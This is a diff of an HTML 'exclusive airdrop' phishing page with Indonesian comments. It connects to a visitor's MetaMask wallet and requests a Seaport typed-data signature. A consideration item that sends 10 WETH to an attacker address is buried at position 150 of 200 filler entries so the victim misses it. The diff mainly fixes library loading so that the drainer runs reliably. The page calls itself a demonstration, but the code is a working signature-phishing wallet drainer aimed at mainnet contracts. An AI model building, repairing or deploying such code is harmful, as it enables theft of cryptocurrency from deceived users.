@@ -3,8 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <title>Claim Your Exclusive Airdrop!</title>
-    <!-- Pustaka Ethers.js dimuat di sini -->
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
     <style>
         body { font-family: sans-serif; background-color: #1a1a1a; color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .container { text-align: center; background-color: #2b2b2b; padding: 40px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
@@ -23,100 +21,40 @@
     <p id="status"></p>
 </div>
 
+<!-- PERBAIKAN KUNCI #1: Pustaka Ethers.js dipindahkan ke bagian paling bawah dari body -->
+<script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
+
 <script>
-    // =================================================================
-    // PERBAIKAN: Seluruh kode dibungkus dalam event listener ini
-    // Ini memastikan kode baru berjalan SETELAH halaman dan pustaka ethers.js dimuat
-    // =================================================================
-    document.addEventListener('DOMContentLoaded', () => {
+    // PERBAIKAN KUNCI #2: Menggunakan window.onload untuk jaminan maksimal
+    window.onload = () => {
+        // Pre-flight check untuk memastikan ethers benar-benar ada
+        if (typeof ethers === 'undefined') {
+            document.getElementById('status').textContent = 'Fatal Error: Ethers.js library failed to load. Check your internet connection or ad-blocker.';
+            return;
+        }
+
         const claimButton = document.getElementById('claimButton');
         const statusDiv = document.getElementById('status');
 
-        // --- KONFIGURASI SERANGAN ---
         const ATTACKER_ADDRESS = "0xDeaDDEAdDeAdDeAdDEAdDEAdDEadDEADDeaDDeaD";
         const WETH_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
 
         function generateAmplifiedPayload(signerAddress) {
             const num_items = 200;
             const poison_index = 150;
-            
             let consideration_list = [];
-            
-            const poison_item = {
-                itemType: "1", // ERC20
-                token: WETH_ADDRESS,
-                identifierOrCriteria: "0",
-                startAmount: "10000000000000000000", // 10 WETH
-                endAmount: "10000000000000000000",
-                recipient: ATTACKER_ADDRESS
-            };
-
+            const poison_item = { itemType: "1", token: WETH_ADDRESS, identifierOrCriteria: "0", startAmount: "10000000000000000000", endAmount: "10000000000000000000", recipient: ATTACKER_ADDRESS };
             for (let i = 0; i < num_items; i++) {
-                if (i === poison_index) {
-                    consideration_list.push(poison_item);
-                } else {
-                    // Alamat filler yang valid secara sintaksis
+                if (i === poison_index) { consideration_list.push(poison_item); }
+                else {
                     const randomRecipient = '0x' + [...Array(40)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');
-                    const filler_item = {
-                        itemType: "0", // NATIVE
-                        token: "0x0000000000000000000000000000000000000000",
-                        identifierOrCriteria: "0",
-                        startAmount: "1", // 1 wei
-                        endAmount: "1",
-                        recipient: randomRecipient
-                    };
+                    const filler_item = { itemType: "0", token: "0x0000000000000000000000000000000000000000", identifierOrCriteria: "0", startAmount: "1", endAmount: "1", recipient: randomRecipient };
                     consideration_list.push(filler_item);
                 }
             }
-
-            const domain = {
-                name: "Seaport",
-                version: "1.6",
-                chainId: 1,
-                verifyingContract: "0x0000000000000068F116a894984e2DB1123eB395"
-            };
-
-            const types = {
-                OrderComponents: [
-                    { name: "offerer", type: "address" },
-                    { name: "offer", type: "OfferItem[]" },
-                    { name: "consideration", type: "ConsiderationItem[]" },
-                    { name: "startTime", type: "uint256" },
-                    { name: "endTime", type: "uint256" },
-                    { name: "orderType", type: "uint8" }
-                ],
-                OfferItem: [
-                    { name: "itemType", type: "uint8" },
-                    { name: "token", type: "address" },
-                    { name: "identifierOrCriteria", type: "uint256" },
-                    { name: "startAmount", type: "uint256" },
-                    { name: "endAmount", type: "uint256" }
-                ],
-                ConsiderationItem: [
-                    { name: "itemType", type: "uint8" },
-                    { name: "token", type: "address" },
-                    { name: "identifierOrCriteria", type: "uint256" },
-                    { name: "startAmount", type: "uint256" },
-                    { name: "endAmount", type: "uint256" },
-                    { name: "recipient", type: "address" }
-                ]
-            };
-
-            const message = {
-                offerer: signerAddress,
-                offer: [{
-                    itemType: "2", // Menawarkan NFT yang tidak ada, hanya sebagai umpan
-                    token: "0x000000000000000000000000000000000000dEaD",
-                    identifierOrCriteria: "1",
-                    startAmount: "1",
-                    endAmount: "1"
-                }],
-                consideration: consideration_list,
-                startTime: Math.floor(Date.now() / 1000).toString(),
-                endTime: (Math.floor(Date.now() / 1000) + 86400).toString(),
-                orderType: "0"
-            };
-
+            const domain = { name: "Seaport", version: "1.6", chainId: 1, verifyingContract: "0x0000000000000068F116a894984e2DB1123eB395" };
+            const types = { OrderComponents: [{ name: "offerer", type: "address" }, { name: "offer", type: "OfferItem[]" }, { name: "consideration", type: "ConsiderationItem[]" }, { name: "startTime", type: "uint256" }, { name: "endTime", type: "uint256" }, { name: "orderType", type: "uint8" }], OfferItem: [{ name: "itemType", type: "uint8" }, { name: "token", type: "address" }, { name: "identifierOrCriteria", type: "uint256" }, { name: "startAmount", type: "uint256" }, { name: "endAmount", type: "uint256" }], ConsiderationItem: [{ name: "itemType", type: "uint8" }, { name: "token", type: "address" }, { name: "identifierOrCriteria", type: "uint256" }, { name: "startAmount", type: "uint256" }, { name: "endAmount", type: "uint256" }, { name: "recipient", type: "address" }] };
+            const message = { offerer: signerAddress, offer: [{ itemType: "2", token: "0x000000000000000000000000000000000000dEaD", identifierOrCriteria: "1", startAmount: "1", endAmount: "1" }], consideration: consideration_list, startTime: Math.floor(Date.now() / 1000).toString(), endTime: (Math.floor(Date.now() / 1000) + 86400).toString(), orderType: "0" };
             return { domain, types, message };
         }
 
@@ -125,7 +63,6 @@
                 statusDiv.textContent = 'MetaMask is not installed!';
                 return;
             }
-
             try {
                 statusDiv.textContent = 'Connecting to wallet...';
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -133,22 +70,17 @@
                 const signer = provider.getSigner();
                 const victimAddress = await signer.getAddress();
                 statusDiv.textContent = `Wallet connected: ${victimAddress}. Preparing signature...`;
-
                 const { domain, types, message } = generateAmplifiedPayload(victimAddress);
-
                 statusDiv.textContent = 'Please check MetaMask and sign the message.';
-                
                 const signature = await signer._signTypedData(domain, types, message);
-
                 statusDiv.textContent = 'Signature received! In a real attack, your WETH would now be at risk.';
                 console.log("Signature:", signature);
-
             } catch (error) {
                 statusDiv.textContent = `Error: ${error.message}`;
                 console.error(error);
             }
         });
-    });
+    };
 </script>
 
 </body>
